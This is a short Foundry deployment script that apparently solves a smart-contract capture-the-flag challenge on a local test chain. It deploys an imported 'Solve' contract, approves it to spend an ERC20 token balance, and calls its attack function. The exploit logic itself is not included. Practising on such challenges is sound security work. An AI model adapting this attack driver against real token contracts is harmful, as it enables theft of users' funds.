// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "../src/Solve.sol";
import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

contract Deploy is Script {
    uint256 balance;

    address target = 0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3;
    address owner   = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address spender = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;


    function run() external {
        vm.startBroadcast();

        balance = ERC20(target).balanceOf(owner);

        Solve solve = new Solve(target, owner, spender);

        ERC20(target).approve(address(solve), balance);

        console.log("Solve Contract Address:", address(solve));

        solve.attack(balance);

        vm.stopBroadcast();
    }
}